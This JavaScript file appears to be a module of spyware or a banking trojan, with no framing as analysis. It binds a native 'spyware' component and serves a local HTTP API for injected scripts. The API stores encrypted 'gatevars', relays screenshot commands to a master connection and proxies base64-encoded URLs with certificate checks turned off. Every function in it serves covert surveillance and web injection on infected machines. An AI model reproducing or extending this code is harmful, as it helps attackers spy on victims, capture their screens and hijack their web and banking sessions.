
var url = require('url');
var https = require('https');
var http = require('http');
var spyware = process.binding("spyware");
var path = require('path');
var fs = require('fs');

function sendText(response, body) {
    response.writeHead(200, {
        'Content-Length': body.length,
        'Content-Type': 'text/plain'
    });
    response.write(body);
    response.end();
}

function sendError(response, body) {
    response.writeHead(503, {
        'Content-Length': body.length,
        'Content-Type': 'text/plain'
    });
    response.write(body);
    response.end();
}


function InjSetVar(query, response) {
    if (query.name) {

        var storedObjects = process.FsReadObjectEncrypted('gatevars.txt');
        if (!storedObjects) {
            storedObjects = {};
        }

        if (!query.value) {
            delete storedObjects[query.name];
        } else {
            storedObjects[query.name] = query.value;
        }

        process.FsWriteObjectEncrypted('gatevars.txt', storedObjects);
    }

    sendText(response, 'true');
}

function InjGetVar(query, response) {

    if (query.name) {

        var storedObjects = process.FsReadObjectEncrypted('gatevars.txt');

        if (!storedObjects) {
            storedObjects = {};
        }

        if (!storedObjects[query.name]) {
            sendError(response, 'not found');
        } else {
            sendText(response, storedObjects[query.name]);
        }

    } else {
        sendError(response, 'invalid parameter');
    }
}

function SpSendLog(query, response) {
    if (query.message) {
        process.log('SpSendLog (API) ', query.message);
        sendText(response, 'true');
    } else {
        sendError(response, 'invalid parameter');
    }
}


function HttpForwardRequest(query, response, request) {

    if (query.b) {
        query.url = new Buffer(query.b, 'base64').toString();
    }

    if (query.url) {

        var parsedUrl = url.parse(query.url);
        
        var engine;

        if (parsedUrl.protocol === 'http:') {
            engine = http;
            if (!parsedUrl.port) {
                parsedUrl.port = 80;
            }
        } else if (parsedUrl.protocol === 'https:') {
            engine = https;
            if(!parsedUrl.port){
                parsedUrl.port = 443;
            }
        } else  return sendError(response, 'invalid protocol');
        

        var remotePort = parseInt(parsedUrl.port);

        var options = {
            host: parsedUrl.host,
            hostname: parsedUrl.hostname,
            port: remotePort + process.PORT_REDIRECTION_BASE,
            path: parsedUrl.path,
            method: 'GET',
            rejectUnauthorized: false
        };

        print(options);

        var req = engine.request(options, function (remote_response) {

            response.writeHead(remote_response.statusCode, remote_response.headers);

            remote_response.on('data', function (d) {
                response.write(d);
            });

            remote_response.on('end', function () {
                response.end();
            });

            remote_response.on('error', function (error) {
                sendError(response, error.message);
            });

        });

        req.on('error', function (e) {
            sendError(response, 'problem with request: ' + e.message);
        });

        req.end();
    } else {
        sendError(response, 'url not specified');
    }
}


function SpTakeScreenshot(query, response, request) {
    var packetBuffer = new Buffer(JSON.stringify({
        quality: query.quality || 30
    }));

    if (process.masterConnection) {
        process.masterConnection.sendProtocolPacket(
            SLAVE_PACKET_API_TAKESCREEN,
            packetBuffer
        );
    }
    else {
        process.pendingMessages.push({
            t: SLAVE_PACKET_API_TAKESCREEN,
            p: packetBuffer
        });
    }    
    sendText(response, 'true');
}

var methods = {
    'InjSetVar': InjSetVar,
    'InjGetVar': InjGetVar,
    'SpSendLog': SpSendLog,
    'SpTakeScreenshot': SpTakeScreenshot,
    'HttpForwardRequest': HttpForwardRequest
};


function serve(request, response) {
    var url_parts = url.parse(request.url, true);
    var query = url_parts.query;
    if (query) {
        var method = query.method;

        if (method && methods[method]) {
            return methods[method](query, response, request);
        } else {
            return sendText(response, 'method not registered');
        }
    } else {
        return sendText(response, 'method not specified');
    }
}


exports.serve = serve;